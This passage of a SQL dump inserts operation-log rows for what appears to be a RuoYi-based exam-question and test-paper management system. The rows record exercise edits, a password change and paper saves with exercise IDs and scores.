src=\\\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAXUAAAFlCAYAAAAUK3hTAAABUmlDQ1BJQ0MgUHJvZmlsZQAAGJV10DFLAmEYB/D/kaFoRENDgeENLoFFnEJDkzqEUHBYobWd53lG5/VydxLtQXtDNDY1SEuTRItDHyAIKvoA+gGEW1Ku5/Wq06IXHp4ffx5eHh5AGCiMGSEADdOxips5sbx/IIZ7iCKBCBYRV1SbZWV5i0bw3Sef+wKB9+cV/lehnxDCCyVhafuu+dZq3f+dn3jRqmar1AdUSZVZDiCIZPnEYdyMPG/RUuQzbt33FXfF9+1oZreYJ3fIc2pdqZKfyKnKWK6PuWE01a8d+PYzmrm3Qz1CFYeEDMqQ/pnJjGbyOAbDKSwcQkcdDkRkKWEwoJELMKFiFSmyhDWqNL/t75sF2dE1sH5O6AZZrQs8XACzG0GWlGmVHvAYY4ql/FxScEN2LS35jrWB6UvP65eA8DIwfPW8j7bnDW+AqXeg434CzANhFHOUvbUAAAA4ZVhJZk1NACoAAAAIAAGHaQAEAAAAAQAAABoAAAAAAAKgAgAEAAAAAQAAAXWgAwAEAAAAAQAAAWUAAAAAherisQAAQABJREFUeAHtnQf8HkXx/9cuiCWEXiQQQu+9SkkIHf8SkCIt1NBBaqSFEooiQgAhwI8iEGoiQSFU6b0EpJdQA4TeREHU+897ZM997rm7555evjOv1z23tzvbPvfc3N7s7szXIiFnZAgYAoaAIdATCHy9J3phnTAEDAFDwBBQBEyo2x/BEDAEDIEeQsCEeg/dTOuKIWAIGAIm1O0/YAgYAoZADyFgQr2HbqZ1xRAwBAwBE+r2HzAEDAFDoIcQMKHeQzfTumIIGAKGQMcL9UMPPdRdcsklTblTV199tdt1113jo1GVUGZfoM8++0yxS+vreuut51566aW0JIszBAyBJiLwtUqbj0aOHOlOPPFE14w9Sl/72tfc3//+dzfddNM5wml1EA+lpdWLy8SJE90dd9zh/vWvf7nTTz+9YXVk9aXe9rYi/4orruhOOukkt+aaa1as7oMPPnD9+/dPxQ0M+vXr5+AxMgQMgdYhkCnUt9lmG3fppZe6b33rW+7LL79MfXDrbWYo/MJwWO5HH33kvvOd76jgD+MbGf7HP/7hpp9++ob1MasvjWwzLznqaTRR5m233Va3UH/nnXfcTDPN5L7+9Y7/GGw0hFaeIdBWBDKfOAT6M8884/75z382pYGVRt7bbrut49h7771TP/GvueYad84552jblllmGTfjjDO6N954I7Wtd955p9txxx3duHHjUtOzIhnFH3TQQSXJXI8aNaokjov111/fffvb33ZbbLFFWRoRRx11lKbDVy/9+Mc/zhSWfPmMGDHCHX/88WXVgPk666yjL+rFFlvMXX755TEP/fJ9PfvsszUcxnlGylhhhRW0L2lqJn/fDjjgAP3C8/nC84svvujmnHNON9tss7nXX389TNIwL4JZZpmlLN4iDAFDoAAC8pBWJCmmIk81DAsssEAkggmbM9E888yjhw/vtddeWpSP/8Y3vqF8yfJ32WWXaPnll9e0jTfeOFp88cU1LHremFU+/TVORvpan6gDIl9+zCQBEYSpdYwePbosnnaKyiHO/uabbyrPwgsvHIkwjURQleT5z3/+E9GHH/7wh1r3zDPPrOmff/55XEbRgC9rhhlmiAgnibZxzD333NGss84a0W9P7777rqaBPRistNJKkbwMfXI011xz6UF+2uivOXuaPHmylgHu9NX3xadz9veNcn7yk5+ESRpeZJFFtIxhw', '{\"msg\":\"操作成功\",\"code\":200,\"data\":118}', 0, NULL, '2023-10-31 20:13:04', 45);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (407, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'test', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"test\",\"createTime\":\"2023-10-31 20:55:58\",\"exerciseProgram\":\"<p><img src=\\\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQsAAAFMCAYAAADcCJmGAAABUmlDQ1BJQ0MgUHJvZmlsZQAAGJV10DFLAmEYB/D/kaFoRENDgeENLoFFnEJDkzqEUHBYobWd53lG5/VydxLtQXtDNDY1SEuTRItDHyAIKvoA+gGEW1Ku5/Wq06IXHp4ffx5eHh5AGCiMGSEADdOxips5sbx/IIZ7iCKBCBYRV1SbZWV5i0bw3Sef+wKB9+cV/lehnxDCCyVhafuu+dZq3f+dn3jRqmar1AdUSZVZDiCIZPnEYdyMPG/RUuQzbt33FXfF9+1oZreYJ3fIc2pdqZKfyKnKWK6PuWE01a8d+PYzmrm3Qz1CFYeEDMqQ/pnJjGbyOAbDKSwcQkcdDkRkKWEwoJELMKFiFSmyhDWqNL/t75sF2dE1sH5O6AZZrQs8XACzG0GWlGmVHvAYY4ql/FxScEN2LS35jrWB6UvP65eA8DIwfPW8j7bnDW+AqXeg434CzANhFHOUvbUAAAA4ZVhJZk1NACoAAAAIAAGHaQAEAAAAAQAAABoAAAAAAAKgAgAEAAAAAQAAAQugAwAEAAAAAQAAAUwAAAAAbKuZIQAAQABJREFUeAHsXQd4FEUbfiG990qAQCCEngKhdxCkSBOkqPwiIiJVEVEsIEXFXkAFaQLSpEiVEgg99IQaAiGFkEoISUgv/PPNsZe7y116wiXMPM/dzk7fd3e//eabmXfwpIpcTHLckyUHlz5x+cjrif3sFk8+2rn4SXDsnUqtPTXz8RO84/jk0M1j/Hjm7oVS1ecXfOKJ2cxGavO8uvrdJ5/v+UZtXGkD07Mznmw8v+NJn59f4e0ctXLSkyO3Tj7Jy88rbVEivUCg0hCojSpyjub2+KDPZIQvPI91//sVwXG3MXnTHKXaF/33E+bsXKQUVp4TUwMTvOo7HG/8NQMulk5o5+pdnuIqLe+JO2fxwfYv0MejK2K+CsLG8b+hh3sn1K5VZben0q5NFFxzENCt6kvRqa2DF5p247+07HSl6vdf90NMcjy+GjJXKbw8J6PaDMH6c9vwaf+ZqFWrVomKWn1mE8avmylPW2uyE/cnfx8Cc0MzeXhFebo0aseFKGEjnEBAWxGoRTqLtjZOtEsgIBDQHgSEnqs990K0RCCg1QgIYaHVt0c0TiCgPQgIYaE990K0RCCg1QgIYaHVt0c0TiCgPQgIYaE990K0RCCg1QgIYaHVt0c0TiCgPQhUG2ERcvA60hMflxu58NOhSIpILHc5ogCBwPOGQLmERUxMDB49eqTxV5YpHP7fHAC90Kpu2zsbEH8rTjW41OdHvtyP8FN3Sp1PZBAIPO8IlHsG5+zZs5Gfn18Ix6ZNm+L9998vFF5cQOjRW7B0sQI6uhWXVMQLBAQCVYiAzjzmylqfmZkZTE1NcfXqVaUiaFr11KlTQfGaHFslBRIMB+fvhrmzJW4duI5/p29C7LX7iLoQgcBN53GHxbcc5sWLOPmzH57kPcG+j7bh1C9HYGxtAseWdXhcVmom9s7+Bzum/I0La07hSf4T1G1TH2x+N9ISUrH1rb+wY/LfrOxopMYko25bVzi1dMHmN9YgPycPDs2deTnUzVk54Ge4dmrE6tmOh2GJsKpvAwNTA02XIcIFAs8NAuXWLHr06IHg4GBcvHhRDtqoUaPg7Cx7AeWBTz2psSkI2nIB51efRF52HrzHtoOduz3smjigUU8PbBm/Bs2HeKH5S62ho6+8ViLUPxgv/fAKooOi8O+MzWg6oBUMzA1x7NuDiDhzFyOWv45H9x5i74fbYO/hyMsLWH6cCYzH+N+OyQjefw23/rsmb5KLT31QfKsRPjzsxu4ryM3KhW0jOx52dsUJ+C3ai2asLT6vtUeDzo1Rq3b', '{\"msg\":\"操作成功\",\"code\":200,\"data\":119}', 0, NULL, '2023-10-31 20:55:58', 31);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (408, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'test', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"test\",\"createTime\":\"2023-10-31 20:55:58\",\"exerciseProgram\":\"<p><img src=\\\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQsAAAFMCAYAAADcCJmGAAABUmlDQ1BJQ0MgUHJvZmlsZQAAGJV10DFLAmEYB/D/kaFoRENDgeENLoFFnEJDkzqEUHBYobWd53lG5/VydxLtQXtDNDY1SEuTRItDHyAIKvoA+gGEW1Ku5/Wq06IXHp4ffx5eHh5AGCiMGSEADdOxips5sbx/IIZ7iCKBCBYRV1SbZWV5i0bw3Sef+wKB9+cV/lehnxDCCyVhafuu+dZq3f+dn3jRqmar1AdUSZVZDiCIZPnEYdyMPG/RUuQzbt33FXfF9+1oZreYJ3fIc2pdqZKfyKnKWK6PuWE01a8d+PYzmrm3Qz1CFYeEDMqQ/pnJjGbyOAbDKSwcQkcdDkRkKWEwoJELMKFiFSmyhDWqNL/t75sF2dE1sH5O6AZZrQs8XACzG0GWlGmVHvAYY4ql/FxScEN2LS35jrWB6UvP65eA8DIwfPW8j7bnDW+AqXeg434CzANhFHOUvbUAAAA4ZVhJZk1NACoAAAAIAAGHaQAEAAAAAQAAABoAAAAAAAKgAgAEAAAAAQAAAQugAwAEAAAAAQAAAUwAAAAAbKuZIQAAQABJREFUeAHsXQd4FEUbfiG990qAQCCEngKhdxCkSBOkqPwiIiJVEVEsIEXFXkAFaQLSpEiVEgg99IQaAiGFkEoISUgv/PPNsZe7y116wiXMPM/dzk7fd3e//eabmXfwpIpcTHLckyUHlz5x+cjrif3sFk8+2rn4SXDsnUqtPTXz8RO84/jk0M1j/Hjm7oVS1ecXfOKJ2cxGavO8uvrdJ5/v+UZtXGkD07Mznmw8v+NJn59f4e0ctXLSkyO3Tj7Jy88rbVEivUCg0hCojSpyjub2+KDPZIQvPI91//sVwXG3MXnTHKXaF/33E+bsXKQUVp4TUwMTvOo7HG/8NQMulk5o5+pdnuIqLe+JO2fxwfYv0MejK2K+CsLG8b+hh3sn1K5VZben0q5NFFxzENCt6kvRqa2DF5p247+07HSl6vdf90NMcjy+GjJXKbw8J6PaDMH6c9vwaf+ZqFWrVomKWn1mE8avmylPW2uyE/cnfx8Cc0MzeXhFebo0aseFKGEjnEBAWxGoRTqLtjZOtEsgIBDQHgSEnqs990K0RCCg1QgIYaHVt0c0TiCgPQgIYaE990K0RCCg1QgIYaHVt0c0TiCgPQgIYaE990K0RCCg1QgIYaHVt0c0TiCgPQhUG2ERcvA60hMflxu58NOhSIpILHc5ogCBwPOGQLmERUxMDB49eqTxV5YpHP7fHAC90Kpu2zsbEH8rTjW41OdHvtyP8FN3Sp1PZBAIPO8IlHsG5+zZs5Gfn18Ix6ZNm+L9998vFF5cQOjRW7B0sQI6uhWXVMQLBAQCVYiAzjzmylqfmZkZTE1NcfXqVaUiaFr11KlTQfGaHFslBRIMB+fvhrmzJW4duI5/p29C7LX7iLoQgcBN53GHxbcc5sWLOPmzH57kPcG+j7bh1C9HYGxtAseWdXhcVmom9s7+Bzum/I0La07hSf4T1G1TH2x+N9ISUrH1rb+wY/LfrOxopMYko25bVzi1dMHmN9YgPycPDs2deTnUzVk54Ge4dmrE6tmOh2GJsKpvAwNTA02XIcIFAs8NAuXWLHr06IHg4GBcvHhRDtqoUaPg7Cx7AeWBTz2psSkI2nIB51efRF52HrzHtoOduz3smjigUU8PbBm/Bs2HeKH5S62ho6+8ViLUPxgv/fAKooOi8O+MzWg6oBUMzA1x7NuDiDhzFyOWv45H9x5i74fbYO/hyMsLWH6cCYzH+N+O', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-31 21:12:45', 40);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (409, '个人信息', 2, 'com.ruoyi.project.system.controller.SysProfileController.updatePwd()', 'PUT', 1, 'admin', NULL, '/system/user/profile/updatePwd', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-01 08:25:13', 400);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (410, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.add()', 'POST', 1, 'admin', NULL, '/dataControl/paper/add', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-11-01 08:43:02\",\"id\":1,\"paperName\":\"测试试卷\",\"params\":{}}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-01 08:43:02', 56);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (411, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.add()', 'POST', 1, 'admin', NULL, '/dataControl/paper/add', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-11-01 14:45:42\",\"id\":2,\"paperName\":\"213\",\"params\":{},\"remark\":\"123\"}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":2}', 0, NULL, '2023-11-01 14:45:42', 57);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (412, '试卷管理', 2, 'com.ruoyi.project.csp.controller.TbPaperController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/paper/edit', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-11-01 08:43:02\",\"id\":1,\"isDelete\":0,\"paperName\":\"测试试卷\",\"params\":{},\"remark\":\"这是一条备注123\",\"updateBy\":\"admin\",\"updateTime\":\"2023-11-01 21:40:35\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-01 21:40:35', 41);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (413, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"\",\"createBy\":\"admin\",\"createTime\":\"2023-10-30 15:01:42\",\"exerciseProgram\":\"<pre class=\\\"ql-syntax\\\" spellcheck=\\\"false\\\">#include&lt;iostream&gt;\\nusing namespace std;\\nint main()\\n{\\n  return 0;\\n}\\n</pre><p><img src=\\\"/dev-api/profile/upload/2023/10/31/640_20231031145427A002.png\\\"></p><p>asdasdasdasd111123hhhttt</p>\",\"exerciseType\":-1,\"id\":5,\"isDelete\":0,\"params\":{},\"quesType\":1,\"remark\":\"备注123456\",\"updateBy\":\"admin\",\"updateTime\":\"2023-11-02 09:24:31\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-02 09:24:31', 31);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (414, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.save()', 'POST', 1, 'admin', NULL, '/dataControl/paper/save', '127.0.0.1', '内网IP', '{\"baseExerciseList\":[{\"id\":95,\"score\":3},{\"id\":29,\"score\":3},{\"id\":4,\"score\":3},{\"id\":33,\"score\":3},{\"id\":1,\"score\":3},{\"id\":30,\"score\":3},{\"id\":118,\"score\":3},{\"id\":2,\"score\":3},{\"id\":28,\"score\":3},{\"id\":86,\"score\":3},{\"id\":32,\"score\":3},{\"id\":97,\"score\":3}],\"completionProgramList\":[{\"id\":58,\"score\":0,\"scoreList\":{}},{\"id\":64,\"score\":0,\"scoreList\":{}},{\"id\":13,\"score\":0,\"scoreList\":{}},{\"id\":15,\"score\":0,\"scoreList\":{}},{\"id\":62,\"score\":0,\"scoreList\":{}},{\"id\":73,\"score\":1,\"scoreList\":{\"74\":1}},{\"id\":38,\"score\":0,\"scoreList\":{}}],\"paperName\":\"211\",\"readProgramList\":[{\"id\":94,\"score\":0,\"scoreList\":{}},{\"id\":78,\"score\":3,\"scoreList\":{\"79\":3}},{\"id\":14,\"score\":0,\"scoreList\":{}},{\"id\":34,\"score\":0,\"scoreList\":{}},{\"id\":40,\"score\":0,\"scoreList\":{}},{\"id\":10,\"score\":3,\"scoreList\":{\"105\":3}},{\"id\":26,\"score\":0,\"scoreList\":{}},{\"id\":39,\"score\":0,\"scoreList\":{}},{\"id\":54,\"score\":0,\"scoreList\":{}},{\"id\":98,\"score\":0,\"scoreList\":{}},{\"id\":36,\"score\":0,\"scoreList\":{}},{\"id\":53,\"score\":0,\"scoreList\":{}},{\"id\":24,\"score\":0,\"scoreList\":{}},{\"id\":63,\"score\":0,\"scoreList\":{}},{\"id\":90,\"score\":0,\"scoreList\":{}},{\"id\":55,\"score\":0,\"scoreList\":{}},{\"id\":117,\"score\":0,\"scoreList\":{}},{\"id\":11,\"score\":0,\"scoreList\":{}},{\"id\":21,\"score\":0,\"scoreList\":{}},{\"id\":87,\"score\":0,\"scoreList\":{}},{\"id\":46,\"score\":0,\"scoreList\":{}},{\"id\":12,\"score\":0,\"scoreList\":{}},{\"id\":22,\"score\":0,\"scoreList\":{}},{\"id\":88,\"score\":0,\"scoreList\":{}},{\"id\":82,\"score\":3,\"scoreList\":{\"83\":3}},{\"id\":17,\"score\":0,\"scoreList\":{}},{\"id\":71,\"score\":3,\"scoreList\":{\"72\":3}},{\"id\":49,\"score\":0,\"scoreList\":{}},{\"id\":84,\"score\":3,\"scoreList\":{\"85\":3}},{\"id\":5,\"score\":18,\"scoreList\":{\"92\":3,\"100\":3,\"101\":3,\"102\":3,\"103\":3,\"104\":3}},{\"id\":42,\"score\":0,\"scoreList\":{}},{\"id\":65,\"score\":3,\"scoreList\":{\"66\":3}},{\"id\":47,\"score\":0,\"scoreList\":{}},{\"id\":37,\"score\":0,\"scoreList\":{}},{\"id\":25,\"score\":0,\"scoreList\":{}},{\"id\":70,\"score\":0,\"scoreList\":{}},{\"id\":96,\"score\":0,\"scoreList\":{}},{\"id\":48,\"score\":0,\"scoreList\":{}},{\"id\":50,\"sc', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-02 16:55:21', 27);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (415, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.save()', 'POST', 1, 'admin', NULL, '/dataControl/paper/save', '127.0.0.1', '内网IP', '{\"baseExerciseList\":[{\"id\":95,\"score\":3},{\"id\":29,\"score\":3},{\"id\":4,\"score\":3},{\"id\":33,\"score\":3},{\"id\":1,\"score\":3},{\"id\":30,\"score\":3},{\"id\":118,\"score\":3},{\"id\":2,\"score\":3},{\"id\":28,\"score\":3},{\"id\":86,\"score\":3},{\"id\":32,\"score\":3},{\"id\":97,\"score\":3}],\"completionProgramList\":[{\"id\":58,\"score\":0,\"scoreList\":{}},{\"id\":64,\"score\":0,\"scoreList\":{}},{\"id\":13,\"score\":0,\"scoreList\":{}},{\"id\":15,\"score\":0,\"scoreList\":{}},{\"id\":62,\"score\":0,\"scoreList\":{}},{\"id\":73,\"score\":1,\"scoreList\":{\"74\":1}},{\"id\":38,\"score\":0,\"scoreList\":{}}],\"paperName\":\"211\",\"readProgramList\":[{\"id\":94,\"score\":0,\"scoreList\":{}},{\"id\":78,\"score\":3,\"scoreList\":{\"79\":3}},{\"id\":14,\"score\":0,\"scoreList\":{}},{\"id\":34,\"score\":0,\"scoreList\":{}},{\"id\":40,\"score\":0,\"scoreList\":{}},{\"id\":10,\"score\":3,\"scoreList\":{\"105\":3}},{\"id\":26,\"score\":0,\"scoreList\":{}},{\"id\":39,\"score\":0,\"scoreList\":{}},{\"id\":54,\"score\":0,\"scoreList\":{}},{\"id\":98,\"score\":0,\"scoreList\":{}},{\"id\":36,\"score\":0,\"scoreList\":{}},{\"id\":53,\"score\":0,\"scoreList\":{}},{\"id\":24,\"score\":0,\"scoreList\":{}},{\"id\":63,\"score\":0,\"scoreList\":{}},{\"id\":90,\"score\":0,\"scoreList\":{}},{\"id\":55,\"score\":0,\"scoreList\":{}},{\"id\":117,\"score\":0,\"scoreList\":{}},{\"id\":11,\"score\":0,\"scoreList\":{}},{\"id\":21,\"score\":0,\"scoreList\":{}},{\"id\":87,\"score\":0,\"scoreList\":{}},{\"id\":46,\"score\":0,\"scoreList\":{}},{\"id\":12,\"score\":0,\"scoreList\":{}},{\"id\":22,\"score\":0,\"scoreList\":{}},{\"id\":88,\"score\":0,\"scoreList\":{}},{\"id\":82,\"score\":3,\"scoreList\":{\"83\":3}},{\"id\":17,\"score\":0,\"scoreList\":{}},{\"id\":71,\"score\":3,\"scoreList\":{\"72\":3}},{\"id\":49,\"score\":0,\"scoreList\":{}},{\"id\":84,\"score\":3,\"scoreList\":{\"85\":3}},{\"id\":5,\"score\":18,\"scoreList\":{\"92\":3,\"100\":3,\"101\":3,\"102\":3,\"103\":3,\"104\":3}},{\"id\":42,\"score\":0,\"scoreList\":{}},{\"id\":65,\"score\":3,\"scoreList\":{\"66\":3}},{\"id\":47,\"score\":0,\"scoreList\":{}},{\"id\":37,\"score\":0,\"scoreList\":{}},{\"id\":25,\"score\":0,\"scoreList\":{}},{\"id\":70,\"score\":0,\"scoreList\":{}},{\"id\":96,\"score\":0,\"scoreList\":{}},{\"id\":48,\"score\":0,\"scoreList\":{}},{\"id\":50,\"sc', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-02 16:57:19', 7);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (416, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.save()', 'POST', 1, 'admin', NULL, '/dataControl/paper/save', '127.0.0.1', '内网IP', '{\"baseExerciseList\":[{\"id\":29,\"score\":3},{\"id\":86,\"score\":3},{\"id\":4,\"score\":3},{\"id\":32,\"score\":3},{\"id\":30,\"score\":3},{\"id\":27,\"score\":3},{\"id\":1,\"score\":3},{\"id\":118,\"score\":3},{\"id\":3,\"score\":3},{\"id\":33,\"score\":3},{\"id\":97,\"score\":3},{\"id\":2,\"score\":3},{\"id\":31,\"score\":3},{\"id\":95,\"score\":3},{\"id\":28,\"score\":3}],\"completionProgramList\":[],\"paperName\":\"123\",\"readProgramList\":[],\"remark\":\"12\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-02 16:57:34', 9);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (417, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.save()', 'POST', 1, 'admin', NULL, '/dataControl/paper/save', '127.0.0.1', '内网IP', '{\"baseExerciseList\":[{\"id\":29,\"score\":3},{\"id\":86,\"score\":3},{\"id\":4,\"score\":3},{\"id\":32,\"score\":3},{\"id\":30,\"score\":3},{\"id\":27,\"score\":3},{\"id\":1,\"score\":3},{\"id\":118,\"score\":3},{\"id\":3,\"score\":3},{\"id\":33,\"score\":3},{\"id\":97,\"score\":3},{\"id\":2,\"score\":3},{\"id\":31,\"score\":3},{\"id\":95,\"score\":3},{\"id\":28,\"score\":3}],\"completionProgramList\":[],\"paperName\":\"123\",\"readProgramList\":[],\"remark\":\"12\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-02 17:01:16', 4);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (418, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.save()', 'POST', 1, 'admin', NULL, '/dataControl/paper/save', '127.0.0.1', '内网IP', '{\"baseExerciseList\":[{\"id\":29,\"score\":3},{\"id\":86,\"score\":3},{\"id\":4,\"score\":3},{\"id\":32,\"score\":3},{\"id\":30,\"score\":3},{\"id\":27,\"score\":3},{\"id\":1,\"score\":3},{\"id\":118,\"score\":3},{\"id\":3,\"score\":3},{\"id\":33,\"score\":3},{\"id\":97,\"score\":3},{\"id\":2,\"score\":3},{\"id\":31,\"score\":3},{\"id\":95,\"score\":3},{\"id\":28,\"score\":3}],\"completionProgramList\":[],\"paperName\":\"123\",\"readProgramList\":[],\"remark\":\"12\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-02 17:01:27', 5);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (419, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.save()', 'POST', 1, 'admin', NULL, '/dataControl/paper/save', '127.0.0.1', '内网IP', '{\"baseExerciseList\":[{\"id\":86,\"score\":3}],\"completionProgramList\":[],\"paperName\":\"21\",\"readProgramList\":[],\"remark\":\"21\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-02 17:02:37', 10);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (420, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.save()', 'POST', 1, 'admin', NULL, '/dataControl/paper/save', '127.0.0.1', '内网IP', '{\"baseExerciseList\":[{\"id\":2,\"score\":12},{\"id\":95,\"score\":12},{\"id\":31,\"score\":12},{\"id\":3,\"score\":12}],\"completionProgramList\":[],\"paperName\":\"213\",\"readProgramList\":[]}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-02 17:06:45', 7);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (421, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.save()', 'POST', 1, 'admin', NULL, '/dataControl/paper/save', '127.0.0.1', '内网IP', '{\"baseExerciseList\":[{\"id\":86,\"score\":1},{\"id\":118,\"score\":1},{\"id\":30,\"score\":1},{\"id\":2,\"score\":1},{\"id\":3,\"score\":1},{\"id\":97,\"score\":1},{\"id\":27,\"score\":1},{\"id\":33,\"score\":1},{\"id\":32,\"score\":1},{\"id\":95,\"score\":1},{\"id\":31,\"score\":1},{\"id\":4,\"score\":1},{\"id\":28,\"score\":1},{\"id\":1,\"score\":1},{\"id\":29,\"score\":1}],\"completionProgramList\":[],\"paperName\":\"12\",\"readProgramList\":[]}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-02 17:08:12', 6);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (422, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.save()', 'POST', 1, 'admin', NULL, '/dataControl/paper/save', '127.0.0.1', '内网IP', '{\"baseExerciseList\":[{\"id\":1,\"score\":2},{\"id\":33,\"score\":2},{\"id\":95,\"score\":2},{\"id\":118,\"score\":2},{\"id\":27,\"score\":2},{\"id\":28,\"score\":2},{\"id\":4,\"score\":2},{\"id\":2,\"score\":2},{\"id\":3,\"score\":2},{\"id\":31,\"score\":2},{\"id\":32,\"score\":2},{\"id\":86,\"score\":2},{\"id\":97,\"score\":2},{\"id\":29,\"score\":2},{\"id\":30,\"score\":2}],\"completionProgramList\":[],\"paperName\":\"12\",\"readProgramList\":[],\"remark\":\"3\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-02 17:08:34', 3);
